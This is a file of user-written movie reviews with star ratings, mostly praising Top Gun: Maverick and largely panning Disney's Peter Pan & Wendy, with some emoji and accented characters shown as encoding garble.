"Recently i watched a film that i did not know existed up until this point. I wish it could have stayed this way forever. This film is awful. I saw this film on IMDB and thought 'this looks like a decent laugh'. I am an avid film watcher so I gave this film a go with my critic pals. This film was published in 2001 so I thought the graphics may not be the best but kept that at the back of my mind while watching this. The story is shambolic and if it got released nowadays it would be as the young chaps say 'cancelled'. This film sent me to hospital and I am writing this review from a mental asylum. I would not recommend watching this film. Even as the title, 'Freddy got Fingered', suggests this film is a disgrace to humanity and makes you feel sick inside.",1.5
"a kind of grand action movie that died out long ago ... yet not lacking in substance, fun and emotion. well-rounded and fun to watch again. just one question: they could bomb the enemy airfield, but not the SAMs? why?",5
"Loved it! They did a great job just making an entertaining movie without preaching at the audience like so many movies nowadays. Loved the music, visuals, and nods back to the original. Flying scenes really got the heart pumping.",5
"Thrilling action, some nice sweetness, charismatic performances, killer soundtrack. What's not to love?",4
"The sequel to the 1986 film Top Gun, in which, after thirty years, Maverick confronts his past demons while training a group of younger elite Top Gun graduates, including the son of his deceased best friend, for a dangerous high-profile mission. It wildly surpasses its predecessor in terms of plot and, obviously, visual effects. Quite an enjoyable ride, in which the flying sequences are astounding and breathtaking. This one is even more technical and more accurate, but boring is never an adjective that could describe this film, given its thrilling spectacle. The nostalgia is there, but it tells an original story that adds depth to what had already been established. It is also very satisfying to see the main character evolve and overcome his problems in an epic way. Huge shout-out to the extraordinary theme song 'Hold my Hand' written and performed by Lady Gaga'. Also, 60-year-old Tom Cruise is a legend!!!!",4.5
Decent movies. Better in theater than at home.,3
"This is a fun movie to watch. It will definitely help if you have seen the original film before watching. There is a lot of ""fan service"" that just makes it an enjoyable watch for those who enjoyed the original film (as I did).",5
"Amazing with no Hollywood bs. Casting was phenomenal, couldn't have imagined a better sequel.",5
"Awesome movie. Good story, and accurate for the most part. There were a few cliche moments but they were quickly overlooked by the rest of the story and action. I'm definitely going to watch it again!",4.5
"I really enjoyed the original Top Gun movie, my roommate from college was dating an airforce cadet and it was really exciting and fun in the 80s to go and see that movie. It was fun watching the cadets talk about it as well. What I found unoriginal about this was the same scenes, different people. There was a scene where Cruise had his shirt off on the beach, there was a sex scene. There was even a vintage Porsche, oh and a local bar. I just thought REALLY? They even had someone playing 'Great Balls of Fire' at the piano. The first movie was great. The second was a complete copycat. The storyline in the end was fun, and there was suspense, and Maverick vs. The Military. There was also some emotional turmoil which helped the plot. It was not a five, because it felt remade, but it was still fun and exciting. Tom Cruise looks pretty darn good still after all these years. He has certainly aged better than I have.",4
Re watched Top Gun before watching Maverick and found it really uncomfortable and cringe worthy. Maverick started much the same but thankfully it all came together in the end.,4
"Best movie of 2022 hands down, great plot, great acting and great effects. My faith in Tom is now stronger than ever. What they achieved in and out of the studio is out of this world, if the Oscars made any sense at all this would win best movie without a doubt.",5
Wonderful follow up on Maverick after Top Gun movie. Interesting finishing all of his relationship with his friends and his love life. Great closure for Top Gun and for Maverick.,5
"The ravers are right when it comes to ""Top Gun: Maverick"". Tom Cruise is seamless in his return to the role of Pete Mitchell aka Maverick of the 1986 original. Ordered to train a group of young pilots for an almost impossible mission, he is still as cocky as ever as he attempts to unite them as a team, despite arising complication from his past that need to be reconciled. The slick film has adrenaline-filled action, but also heart, particularly in its handling of Van Kilmer's appearance as Maverick's former nemesis, Iceman. Its pacing keeps your attention in the way that old-school stories used to, with an engaging narrative and solid performances that make seeing it at the cinema a real experience. The call-backs to the original movie are great, but it also stands on its own merit as a very entertaining film, especially in its exciting flying sequences.",5
Best movie to come out in 2022!!!,5
"Everything about this movie was good. The action, suspense, emotional scenes, and lots of nostalgia. Spectacular movie.",5
Amazing movie! The best of 2022!,5
A True blockbuster. Wow.,5
"Excellent movie, Tom Cruise, Miles Teller, and everyone did an incredible job. Highly recommend! I keep watching it over and over.",5
A clich√©--a-minute! Every sentence they utter has been used over and over and over again. The whole plot is a clich√©. Where is William Holden when you need him?,2
"This is NOT a good movie at all. The plot itself is preety lame, it's the basic american movie with a lot of action and close calls, the same old love story and the same old ""your father died because of me"" thing. The movie itself is not even close to 4.5-5 starts, is more likely a 2-star movie. The close calls began to feel very predictible, in the last absolute milisecond the protagonist is saved by something that you can't even think about. Even though, the visuals are great, the feeling and the adrenaline rush are amazing. It's a shame that in 2022 the big studios still use the same ideas you can see in all average-low budget-made in 2 months-american movies. The movie is overrated.",1.5
An OK movie. Way too predictable. I want to know what country owns both F-14s and Su-57s? That would be the empty set.,3.5
Magnifique! Top Gun Maverick is even better than the first one! Tom Cruise is the best.,5
Better than the first one!,4.5
Perfect in every way. What a ride.,5
"Had an absolute blast watching this, great throw back to the original and a lot of fun!",5
"Not a Tom Cruise fan at all, I was thoroughly entertained by this movie. So much so, I went back and watched the original Top Gun, first. It was well casted, written, and acted. The cinematography of the fighter jet sequences were soooo good. I didn't think I would like it as much as I did which was a very pleasant surprise!",4.5
Good show ... the story is a little ridiculous so it's not as good as the original film but still Great fun ... not too serious ... and it doesn't lecture the audience the way so many films seem to now ... one of the best of the year,5
Good movie but not quite as memorable as the first Top Gun. Still enjoyable.,5
"A plot full of cliches as well as an unnecessary back plot. Very predictable. Once you get past that, though, it is an entertaining movie. Oscar nomination? You have to be kidding me. I guess there just aren't any good films any more. Watch ""All Quiet on the Western Front"" if you want to watch an engrossing, well-made film.",3.5
Loved seeing Maverick airborne again!! It was fun to see again and again.,5
not into planes but still i felt the first one was a more honest story. strangely not impressed by any of the new actors.,2
Awesome awesome movie. One of the best I've seen.,5
Awesome sequel that is probably better than the original.,5
Great Movie. Great Action. One of the few legacy sequels that strikes all the right tones.,5
Great sound. Plot is overcooked and plays off nostalgia. Not a good movie but is a fun movie. Sub par acting. Too long.,3
Was skeptical about the pt.2 but glad I seen it. My soft spot in my heart,5
Contains all the ingredients to make it an adrenaline pumping action entertainer. A classic sequel. Best of 2022.,4.5
"A long belated sequel that turns out better than the original, it takes everything that made the first film work and adds to it with more emotion and stakes along with top-level storytelling. This is a perfect example of how to do sequels.",5
good acting but the plot is so simple,5
Its one of the best movies I've seen this century üëå,5
"I don't even think I have to talk about this movie. Amazing pacing, plot that somehow manages to pay homage to the original while keeping it fresh enough that it doesn't feel like a retread of the original. the Relationship between Rooster and Maverik is amazing, Maverik and Rooster's respective arcs are amazing and the small bits of fanservice like Rooster taking up Goose's old role in the plane feel earned. This is a perfect reboot and I have nothing but praise for it.",5
"So what if it's an ""action"" film. Well-paced, well-acted, good story. Easily one of the best films of the year. (Granted, in a pretty weak year).",4.5
Goat movie. This was by far the best movie made in the last 20 years.,5
I really liked the original Top Gun movie but Top Gun Maverick is superb! There's nothing gimmicky or contrite about it. It's a beautifully filmed movie with great acting and a smart script! Tom Cruise adds great humor and depth to every scene he's in. It This a movie to rewatch throughout one's life. It's that good!,5
Honestly best remake of Star Wars (1977) I've seen. Maybe even better than the original.,5
I was surprised that it was so good. Much better than its predecessor,4
"One of the greatest movies of all time. It is a masterpiece of old school movie magic with outstanding visuals, story, sound and acting. It's one of those few movies that the audience stands and applauds at the end.",5
"Poorly written, poorly acted. I would have only given this half a star, but the filming of the jets was cool and earned a whole star by itself.",1.5
I really enjoyed watching this and I bought the movie too. 10/10 üëç,5
One of the best action pack movies make me wanna get in a jet. A must see,5
"The movie kept me on the edge of my seat the entire time. It really continues on the storyline beautifully, respecting the original, while building the story to an epic ending. The flight scenes were amazing and the way the actors captured the footage from the backseat really just states that Tom Cruise is still a box-office hit! The entire cast really was amazing, from Miles Turner, Glenn Powell, Jennifer Connelly, Monica Barbaro to Val Kilmer, they did an astounding job. It brought laughter, excitement, and tears all in one hit!",5
"Even better than the first, which if you've seen it, is saying something. If you haven't watched this movie yet, you're missing out",5
American army propaganda ü§¢,0.5
Two hours and ten minutes of the most cornball dialogue I have ever heard. I have seen better acting in a high school play. And a story line that was about as believable as the existence of the tooth fairy. Another dud from Tom Cruise. Pee-yew!,0.5
"What a sequel...! The first was good, the second one was no less impressive...",5
"Just friggen loved it, and so did my kid's.",5
I really don't see what all the hype was about. It was fine.,2
"awesome, just as good as original if not better",5
Great movie with the right amount of action and emotion that will leave you in awe.,5
amazing rip of star wars,4
"Finally a great continuation of a classic that stuck to the roots of the original!! Hollywood is normally good at screwing them up with pushed agendas insteadof just concentrating on the movie. They have a good deal of the original actors, plenty of action and a story that doesn't disappoint with a feelgood ending.",5
"Great action, solid performances. I'd say it better than the original.",4
It was amazing highly recommend.,5
I felt as though the movie was very repetitive and simple and they had a plan and they completed it,3.5
That was effing brilliant,5
Meh. It seemed more like a movie that's sole purpose was to puff up Tom Cruise's ego.,3.5
"I LOVE THE MOVIE it is reallyyy good. best movie ever!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! i have a poster in my room and also a painting and also miles tellers name plate from the awards this year and he handed to my dad and he said ""give this to brinker"" so that is really cool but that did not make me give it five stars the the movie is the star!! i give it a 100% rating and rooster the same.",5
"This Movie is Just INCREDIBLE, nothing like I have every seen before. There is action all the way through while still keeping that high level of humour. I definitely recommend watching this if you haven't already.",5
"Absolutely a great movie. Bought it on Blue Ray and saw it by myself first and then with my wife. We both loved it. The movie brings you back to the 80's experience of watching movies. I can't quite point to what it is that makes you feel like you are back in the 80's, but my wife felt exactly the same way. Does not get much better than this.",5
I thought it was great I just prefer the first one. I saw maverick in theaters twice and it was really good. Good flight scenes and Tom Cruise did not disappoint in this film.,4
my dad loves this movie haha lol,4
This was Probably 2022's best Movie i watched.. Watching Top Gun Maverick was a great experience & every movement I felt was high üëèüëèüëèüí•üí•üí•,5
I watched it like 6 or 7 times and I still really love the movie just like the first top gun movie. Really great movie,5
"Top Gun: Maverick is my all-time favorite film, and I have watched it numerous times in theaters. The film is a thrilling and emotionally powerful story about Pete ""Maverick"" Mitchell (Tom Cruise), who is tasked with training (and later leading) a group of TOPGUN graduates to strike a uranium enrichment plant in a foreign country. One of the graduates is Bradley ""Rooster"" Bradshaw (Miles Teller), who is the son of Maverick's best friend, Nick ""Goose"" Bradshaw, who died. Maverick's conflict with Rooster gradually escalates throughout the film. Maverick has guilt and feels responsible for Goose's death, and this is a central theme throughout the film. His relationship with Penny Benjamin (played by Jennifer Connelly) is pivotal to both of their character arcs as he begins to treat her with more respect and consideration rather than just engaging in casual encounters. Tom Cruise delivers an impressive performance in a scene where Maverick visits Iceman (Val Kilmer) at his house and is torn over whether or not to send Rooster on a risky mission. Maverick is conflicted because if he sends Rooster, he may not come back alive, but if he doesn't send him, Rooster will never forgive him for pulling his naval academy papers and not believing he can fly the mission. The final battle in the film borrows the concept of the final battle from the first Star Wars film and showcases the strong bond between Maverick and Rooster as they work together to take down enemy jets. They use their skills and determination to complete their mission and emerge victorious. The practical filmmaking techniques used in the film add to the sense of realism, making the film an immersive and engaging experience. The score, composed by Hans Zimmer, Lorne Balfe, and Harold Faltemeyer, adds to the excitement with its intense and thrilling pieces of music. Overall, Top Gun: Maverick is a well-acted, emotionally powerful film with exciting action scenes and a thrilling score. The themes of personal conflict and overcoming guilt are explored in a nuanced and complex way, and the characters of Maverick and Rooster are fully fleshed out and compelling. This movie is not just for fans of action films, but for everyone who enjoys well-crafted storytelling with emotional depth and complex character development. With its inspiring message of overcoming personal challenges and trusting in your instincts, Top Gun: Maverick is my all-time favorite film and one that will leave you feeling uplifted and motivated. If you haven't seen it yet, I highly recommend giving it a watch.",5
"Extremely entertaining, giving you exactly what you come to see.",5
Remember. Epic. Fantastic,5
Extremely fun to watch. The movie is pure entertainment.,5
The whole entire movie wasn‚Äôt anything wrong with animosity between two men being competitors. Great work moving along the story line. Movie was long and had room for more out takes. Probably not the movie you go see and the crowded audiences is average consumer‚Äôs. This one for the men and woman of service to look at each other during exciting moments.,2.5
this movie may be even better than the original! you can watch it and still enjoy it after the 3rd or 4th time.,5
Believe it or not it‚Äôs a superior film to the original. It single handily got people going back to the movies. The importance of this film can‚Äôt be overstated! Great performances all around which should come with Oscar nominations.,5
"I'm rather tired of Tom Cruise playing the same role over and over again, not to mention that the great assignment of the movie is for the Top Gun group to destroy the Death Star in the same way Luke Skywalker did back in 1977--that's a bit old, too. Nothing else here to speak of--certainly not great acting,",2.5
"Top Gun: Maverick is a dazzling and spectacular film. It's also a bit underwhelming when the film is on the ground. But the scenes in the air are completely exhilarating. This is a long awaited (over 30 years) sequel to the original Top Gun, a film I have never actually seen. In the original Tom Cruise played 'Maverick', a hotshot young Naval pilot at the Top Gun Academy. In the time since he has never risen above the rank of Captain, preferring to keep flying and not be in command of anything. In this sequel he is called back to teach a bunch of new young pilots on how to take on a very dangerous mission. There's not a whole lot more to the plot than this and the scenes are rife with clunky dialogue. But when the planes take to the air you will be blown away. The direction and cinematography are first class. The last 30 minutes is especially spectacular.",3.5
"I had a bad feeling about this movie and couldn't even believe the high ratings. But after watching it, I was very impressed by the photography and acting. No corny lines like in the first one. The scenes pacing, plot and references were almost perfect. The throwback using the old songs wasn't too cheesy but actually the right choice. Hans Zimmer's beautifully written scores and Gaga's voice on top of it all was such a good mix. A really nice movie to watch, easy to understand even if you haven't seen the first one.",5
"Need more movies like this. Yes, it was basically the replay of Top Gun but so refreshing to just see a classic non woke entertaining movie",4
"I am one who does not think the first Top Gun is anything special, but this movie was incredibly entertaining. However vague the story, there was still an actual story for the movie to be based on, which is what the first one felt like it lacked to me. This movie literally had me on the edge of my seat at the climax, which no movie has managed to do in years. There were nice throwbacks to the original as tribute, but this movie stands on its own. Well done Tom Cruise, well done.",5
stunning. this is cinema. a must see in theatres,5
greatest movie of the year! treated the original movie with respect of the main character arc love it,5
Another great Tom Cruise movie üëçüèº,5
This Movie is Incredible the movie Made all the way in Box Office I'm still watching it on my Ps5,4
Absolutely spectacular,5
"Awesome movie! Great story, music, and action. Real jet action taken on a real aircraft carrier. Doubt if this will ever be matched although I hope it is by Top Gun 3. Watched this movie 30 times already, twice in the theater. Want to see this in IMAX. Some day I hope. Local theaters don't have it.",5
Really liked the movie a lot. BUT did not like how the movie showcases reckless motorcycle riding again! No one should ride without a helmet. I liked the first Top Gun movie too but had the same issue the first time and now again! You wear a helmet while flying you should wear a helmet while riding! Still recommend the movie BUT really wish it would highlight motorcycle safety as well. Helmet can match his flying helmet! We all know it's him and the same for Penny (J.C.).,4
"If I could give it a 7 stars out of five I would. The story is not fresh is the classic, "" Get the lonely old guy to teach the young who is the boss and do what nobody thought was possible while struggling to overcome his own past..."". So, why so many stars? Because the Production was incredible, the acting of all te cast was on point and perfect, all of them had their time to shine, the length was just right and the most important part the nostalgia was a strong factor. If you haven't seen it yet, you should do it, even if you didn't watch or like the the 1986 movie. This movie brings the ""80s American patriotism in movies"" in a way that is not in your face to the point that you dislike it because you are not American or feel that the action sequences are over the top. Tom cruise is a legit action hero, no actor can be compared to him in action sequences, it is a treat to have the opportunity to watch his movies.",5
"One of the best sequences of all time, great action blockbuster!",5
only seen the 1st top gun once as a child so i had a vague memory of the characters yet this one managed to draw me in instantly and left me sat there wishing it didn't have to end fully enjoyed this movie one of the best of the year,5
"Probably one of the best movies if not the best movie I've seen in theatres in the last 5-10 years. It has it all: amazing action, surprises, tasteful references to the previous movie and its past that make sense, the way it was filmed. It is an amazing experience in theatres with amazing cinematics and acting. It is refreshing to see a modern movie that still has a classic movie formula that just focuses on good characters, good filming, good movie experience without trying to sneak in weird cultural or political propaganda.",5
Went to theater watch this movie four times. Really good.,5
Even better than the original! Finally some actual entertainment out of Hollywood.,5
"Awesome movie. Faithful to the original with a whole new spin. Great action, great music, great fun. That's the kind of movie we expect to watch in the theaters.",4.5
Favorite film of the decade so far!,5
A perfect blockbuster. This is what movies are supposed to be. First real blockbuster in years,5
"It's a good fun comfort food movie. But can't an action movie be more than let's defeat this unnamed villain ooh cool we did it, we love each other. To me, this is mind numbing",3.5
This was a very wholesome return to a great classic movie from the late 80s. Nothing too flashy or too bland in the script. They had a great cast and you were hooked on the film in its entirety. I wasn't a fan of Tom Cruise before but this film definitely made me take an interest in his other future projects.,5
ATTENTION HOLLYWOOD: This is how make and promote a movie. The viewer does not need to see the whole movie in its ad. Make it a secret and keep the surprises intact.,5
Must see! Best movie I've seen in a long time. I'd watch it 1000 times!,5
"I watched the first one so many times when I was 8 I memorized it. I really can't understand how people love it so much. It was so cheesy and predictable. Like they had a checklist of nostalgia items, and other token plot points and characters. Felt so scripted, like an aaron sorkin show, where everything falls perfectly into place and has a specific purpose.",2
a shout out for this broken generation.,4.5
Surprisingly great movie with action and heart. Pays adequate homage to original.,5
Great Movie!!! Lots of action,5
4.5: Incredible Movie üòé Fantastic Movie Buy Now And Enjoy,4.5
Loved every minute of it!,5
"The return of the mindless totally thrilling action movie! Tom Cruise never ages, nor does Jennifer Connelly. Loved the first one, loved this one.",5
Absolutely fantastic. Beyond what I expected. Most def worth watching twice...,5
Best movie of the YEAR!! Gives me hope for future films! Non-Woke! All genuine blockbuster! Loved it!!,5
Absolutely amazing movie no unnecessary social messaging just pure cinema loved it,5
"The movie was boring and could not finish it. I don't understand the critics why they like it. The film completely misunderstood Wendy's role in the UK. She was the most important person in the story, a girl on the verge of adulthood. The film decided to get rid of the nuances about her maternal instincts to her brothers and standing up to Peter Pan for not growing up, instead turn her into a girl boss seen in countless movies with no character depth. The only positive thing compared to the original cartoon was the removal of negative Native American stereotypes.",0.5
"I enjoyed this movie. The visuals are somewhat dark but I thought the darker tone in content was interesting and made the idea behind the movie interesting. Even so, it didn't go so dark that it lost the fun of the story. I also liked that it wasn't just a remake of the original animated Disney movie. It took the storie in another direction.",4
A miserable watch throughout. Peter Pan & Wendy truly shows the washed up aspects that a story from long ago holds close. Not adding anything new is always a no when it comes to remakes and Disney hasn't changed nor will they ever it seems.,0.5
"Was hard to watch and no matter how hard i tried, couldn't finish this BS movie.",0.5
Yikers..............,0.5
Couldnt finish watching it,1
This irreverent portrayal of Peter Pan as the unfaithful friend and Hook as the aggrieved former comrade leaves a bitter aftertaste.,1
this movie is pretty boring,0.5
The original was my favorite childhood movie. I have no idea what this abomination was,0.5
This was not a good movie the story was slow the acting was a little stiff and overall a boring movie,1.5
"All the negative reviews must be from people who don't have daughters. I didn't realize how horrid & gross the first one was until I showed it to my little girls. This version was SUCH a redemption. Not to mention, the back story between Pan and Hook made the whole story so much more compelling. There was a clear message about facing the inevitability of growing up. Fantastic acting, interesting storyline, visually stunning - SUCH a great film. What a comeback!",5
Just awful.... unlikable characters with writers that are pushing identify politics over story telling. Its OTT obnoxious femininity and a pure tick-box casting with no depth. Its a straight-up a middle finger to the original story,0.5
It's a waste of time and money.,0.5
"PETER PAN E WENDY √â UM FILME MUITO LENTO , QUE NADA FUNCIONA NESSE FILME , NEM O PETER PAN NEM A WENDY , O FILME √â MUITO SENSIVEL , O FILME CONSEGUE ERRAR EM TUDO DO ORIGINAL , √â UMA COPIA MUITO PIORADA E CHATA , EM RESUMO O FILME √â MUITO LENTO E CHATO....",2
Oof that's the candy head movie it's trash,0.5
"What a horrible piece of crap. A sorry excuse for a ""movie"". AVOID AT ALL COST! DO NOT WASTE YOUR MONEY.",0.5
"Although it is not a very good remake of the original and it doesn't expand upon the book, I found it to be a good enough way to pass the time. I fully endorse the fact that this film takes more time to get going and tries to include many themes about growing up, but the way it is presented on the screen seems to lack any one clear direction or sense of passion for the beloved material it tries to tether itself to.",3
"A passion project gone poorly for director David Lowery (director of The Green Knight) with Peter Pan & Wendy. In Disney's 10th live-action remake since 2015, we get to see Peter Pan become more modern-day and it just blows up in everyone's faces. While Jude Law being the only exception for this tiresome film, Peter Pan & Wendy have nothing else to offer in terms of decent qualities. The makeup was mediocre, the writing was average, the cinematography was poor, but all of it should be blamed on the director: David Lowery. From beginning to end, his direction was all out of whack. Lack of lavish musical numbers, lack of the iconic crocodile, and lack of charm that made everyone fall in love with the original 1953 animated version of Peter Pan. I never thought I would see the day that I would appreciate the sequel to the 1953 film Return to Never Land more than I would with this butchered atrocity called Peter Pan & Wendy and I hated Return to Never Land.",0.5
Disney destroys every new live movie,0.5
"Good: The soundtrack, the sets, and Jude Law. Bad: EVERYTHING else. It is utter garbage if not criminal treatment of the story. To quote Gandalf... ""Flee"".",1.5
What have they done to peter pan wth,0.5
"Absolute garbage. Again Disney destroying source material with their bombastic deluded attitudes. Producers need to step outside of Tinseltown and reflect what audiences want. By destroying sauce material loses the interests of the audience especially in relation to a well-established literature piece. The only good thing about this is Jude law. 100% of the sauce material totally changed to fit their own diluted agenda of what audiences want. It is nonsensical and laughable at the pathetic efforts, just leave old stories alone and create new ones. The priority in storytelling is telling a good story, so when you don't prioritize on good storytelling then it's going to be a fail.",0.5
"So disappointed, so weak... one of the worst movies I've ever seen",2
"So boring.. and acting was terrible. If you're gonna switch the characters and have them be nothing like the original story, then the acting better be at least superb. Disappointing.. didn't even bother finishing it. I miss the old Disney movies. Lately what they have been putting out is a complete disappointment",1
"Disney seems to think that remaking old beloved films by rewriting the stories to fit our ""woke"" culture is a money-making plan. It's not. Even my 9-year-old thought it sucked. It feels overcorrected for modern times and is soulless, plus the CGI is mediocre. I'll be sticking with the classics.",1.5
"Are you kidding? They changed 100% of the story. This won't remind you of the original Disney story in any way. To start with Tinkerbell is a little irrelevant team player who likes Wendy from the beginning. The Lost Boys are girls, Tiger Lily is a ninja, Wendy is an angry snarky girlboss who doesn't want to be anyone's mother, Pan is a jerk, and Hook and he become buddies. Forget the crocodile forget the songs, forget Tinkerbell's betrayal, heck forget Neverland while you're at it, it's a dull drab green and brown place with nothing interesting to see. Amazingly bad version of the story.",0.5
"The bland environments, stereotypical plot-line, much-too-modernised characters (for a film set in the early twentieth century) and disturbing lack of spark and sense of joy (which Neverland is supposed to bring to its visitors) let down ""Peter Pan and Wendy"" to the point that nothing is left but a heartless, charmless two hours that families will never get back after watching.",1.5
Too dark picture wise. Slow and poorly cast. Jude Law as Captain Hook? Who thought that one?,2.5
"E realmente uma boa adapta√ß√£o, mostrando a vis√£o da Wendy onde tudo e sem gra√ßa mais para as crian√ßas a terra e m√°gica, o capit√£o gancho e o Peter pan s√£o dois seres fragmentados que lutam para assumir o pr√≥prio corpo, esse filme e realmente bom",4.5
"Featuring bland performances, poor special effects and modern Hollywood tropes, Disney continues its trend of unwelcome remakes of their classic films.",1.5
I loved the original did not expect this remake to be that good but it was,4
"The worse file I've seen this year. There's almost no point having Peter Pan in this film, he's more of a side character with zero charm or likeability‚Ä¶ should be called Wendy does everything, nobody else required! Another Disney trashing of a great original movie!",0.5
"O filme √© legal, mais √© muito escuro mais prefiro esse do que o original.",2.5
"Peter Pan & Wendy puede faltarle mucho de la esencia en√©rgica y m√°gica de su pel√≠cula original, pero llega a ""brillar"" con una interpretaci√≥n m√°s profunda y deprimente que deja a uno que otro reflexionando sobre el miedo a crecer.",3
"This should have been a cinema film rather than the Little Mermaid! I appreciate that they finally gave this live action Disney remake a story which deserved to be told. They used lines from the original stage play and they explained Pater Pan & Captain Hooks backstory and actually delved into the themes of childhood, memories and growing up. It was quite a pleasant suprise. PS: Loved the pirate sea shanties!!!",3.5
Bad movie. It could be better.,0.5
Horr√≠vel. Disney destruindo os personagens que constitu√≠ram a nossa inf√¢ncia para enfiar goela abaixo uma pauta politica social partid√°ria.,0.5
Don't like how they changed all the characters and their personalities. Ruined the book and classic movie.,1
"This was so unnecessary. It actually could have been a decent movie if they just told the story with new characters and didn't try to make ""Peter Pan"" - it's so different from the original. The Disney original is good, and just wanted to give a shout out to my favorite Peter Pan of all time - the wonderful Mary Martin as Peter in the stage version filmed for TV. You can get it on YouTube and it's even colorized. Great songs, and choreography by Jerome Robbins.",2
"This is so hard to watch. Movie with no soul, no inspiration. It's just boring.",1
"Wow, just wow. How did they OK this project? Obviously, whomever did, didn't care much for the original book. Probably didn't even read it by the looks of this mess. Avoid if you don't like wasting your time.",0.5
Absolutely terrible. Disney unfortunately keeps heading in the wrong direction,0.5
Name of the movie should be WENDY AND peterpan,1
We get it‚Ä¶ you hate boys as much as you hate men.,0.5
What happened to the original characters?! What are you deconstructing?,0.5
10/10 and 5/5 for this movie! This is one of the best movies of this year 2023!,5
Best Disney+ movie since Soul and Hamilton!,5
"This live-action adaptation is the very familiar story of Peter Pan and Wendy, who go to the magical world of Neverland with Wendy's brothers and Peter's best friend Tinker Bell, where they encounter Peter's archenemy Captain Hook. Sadly it was a cheap effort for Disney and it shows. The acting is not very good, except for Jude Law with his outstanding performance, but it is not enough to save the film. However, the changes in personality traits for Wendy and Tiger Lily are most welcome, as they were necessary for today's audience. Ultimately, it was a boring and charmless film with a terrible Peter Pan that leaves a lot to be desired, and a very different ending to the classic film.",2
"This movie should be called ""Wendy"" and that's it. In short: Garbage movie, don't waste your time. I recommend watching the original work, much better.",0.5
Not my thing at all.,1
Engaging and heart felt family-friendly fun! Way more of a pleasure to view than originally anticipated! Will definitely need to rewatch to take everything in.,5
"I loved this movie! It was great. Full of fun fantasy, great action sequences, and a huge twist written into a great script. Alexander Molony and Ever Anderson was great, but Jude Law's performance as Captain Hook was exceptional!",5
Nope. Nope. Nope. Another Disney Flop,0.5
Ah yes like we really want another remake of the same movie üôÑ‚úã,0.5
"It's bland, it's uninspired, and it's pretty boring.",2
"If I could give it a 0, I would",0.5
What did the critics here smoke?,0.5
"They changed everything about the original and it honestly looks and sounds like they didn't try to cast actors who could act, let alone care about making the movie. All the characters look NOTHING like the original. Doesn't even feel like a live action remake. Feels more like a knockoff bootleg that made it to theaters.",0.5
I just dont like it!,0.5
"A diferencia de los cl√°sicos, esta nueva adaptaci√≥n nos trae una nueva perspectiva, el actor carece de ese carisma qu√© representa a Peter pan en cuentos e historias. As√≠ como en la pantalla, sin embargo es una adaptaci√≥n que Merece la pena y oportunidad para nuevos generaciones",4
"""This magic belongs to no boy!"" Really. Really Disney? This in-your-face, girl-bossified adaptation of Barrie's ""Peter and Wendy"" served it's purpose to prove that Disney is fully committed to push inclusion over entertainment value to its ravenous yet dwindling core fans. This was one of the worst films that I've ever had the misfortune to sit through. Molony is flat, expressionless, and dull as Peter Pan. Anderson is a competent actress but looks too old for the part. The filming was delayed due to the pandemic and she...well...grew up. Lush, vibrant, mermaid-inhabited Neverland has become the treeless, colorless, and baron shores of Nova Scotia. Mmkay. No mermaids nor mermen nor mer-anythings. There are different Lost Boy/Girl/Things in every shot to prove Disney has checked every inclusivity box even though all of them lack any discernable personality, agency, or even purpose in the film. Tinker Bell looks like a sticker on the movie adhered only with unconvincing CGI. Wendy asking Peter at the end of the movie, ""Boy, why are you crying?"" As if the writers were making a final feeble attempt to convince the audience they did indeed use the book as source material. By the end, she would probably just call him Peter. Tossing in Barrie's eloquent, innocent prose at the end of the film only emphasized how poorly written and jumbled the screenplay was for this cinematic drivel. I wish Disney was capable of inventing captivating stories about original POC characters that everyone could enjoy together and emphasize true inclusion in its Magic Kingdom. These shoddy, half-baked, race-washing of white characters in live action films almost seem like they're intentionally trying to rile people up.",0.5
zzzzzzzzzzzzzzzzzzzzzzzz,1.5
"Trite. There is nothing new to see here, in fact it's the worst of the peter pan franchise. The ""actors"" are unknown for a reason, because they can't actually act. the storytelling is boring and verges on unwatchable. It's a clear case evil triumphs over good. Personally, I'm over hacks trying to make movies trying so hard to force feed the reason why evil is ok to overcome good. You see, my parents didn't buy me a transformer when I was 14 so now I can retaliate against the world. Sickening.",1
"This is definitely one of the worst Disney remakes ever, it misses all the charm of the original and Disney made it woke wherever they could.",0.5
"Worst Peter Pan movie of them all The 1956 pan movie is more engaging, Wendy actor struggled on a lot of scenes and the Peter Pan had no drive. If you want to watch a Peter Pan watch ""Hook ü™ù """,0.5
Les quedo muy mal. Nada recomendada.,0.5
"Era uma vez, uma mudan√ßa de hist√≥ria, a Wendy e um garoto qualquer que voava, no pr√≥ximo filme, n√£o vai ter mais nem o novo dele, ü§¶üèª‚Äç‚ôÇÔ∏è",0.5
"Wow, Disney is really on a roll.",0.5
A brunette Wendy and Asian/Indian Peter ruined the movie from the get go.,1
"What a dissapoinment. Not sure why it was called Peter pan. Should have been called first nation lass, shavaundabell and Wendy. What a fractured mess",1
"Horr√≠vel, cenas ap√°ticas e nulas. Aquela cena da Wendy batendo na cara do Peter Pan rid√≠cula. NOTA ZERO!!!!!!!!",0.5
it okay. a great disney live action flim but flop.,3.5
"Even though people criticize it, I like it, it's not bad as they say, it's worth watching. the bell fulfills its role. that's all",3
"This was atrocious for so very many reasons, but perhaps the most succinct thing I can say is that the writers of this movie clearly don't LIKE the source material. Not even a bit. This travesty reflects that. Instead, the point was to ""fix"" the source material (and keep the content sludge pipe flowing). The problem is not with remakes per se. Many original Disney animated versions are adaptations themselves. The problem is that modern Disney is not moved to distill the stories in new and/or delightful ways. Rather, it's to capitalize on something that was old, and try to make money/content off of it. Disney can't tell new stories for the same reason their adaptations like this one fall flat: an illiterate grasp of history, and absence of moral imagination, and no understanding/love of storytelling to begin with.",1.5
"Rasist casting, lacks talent",0.5
"This felt like it was written and directed by someone who's never actually written or directed before‚Ä¶ with the original animated movie and all of the subsequent remakes or adaptations as blueprints, it's really unfortunate the way this movie turned out. The whole movie felt awkward and the furthest thing from ""magical"" of any of the new adaptations. Everything was grimy and underwhelming, it just made me want to watch Hook, or the 2003 version with Jeremy Sumpter and Jason Isaacs.",0.5
Don't bother; watch Hook instead.,2
Nothing new ... didn't like how they changed up Tinkerbell... Why'd they bother...this isn't much different than Hook. Peter pan was odd in this too .. not gonna finish it,1
"BAAAD adaptation! I dont recommend it! They RUINED Peter Pan! For those who known the ORIGINAL Peter Pan, my advice is dont watch or you will be extremely deceived. I am so sad that i watch it. I will not watch it again, and will warn others to do the same",0.5
"Overall a good movie. Don't compare it to the original Disney classic or you will be disappointed. A good, made for TV movie!",3
Filme que descaracterizou a hist√≥ria cl√°ssica do personagem.,1
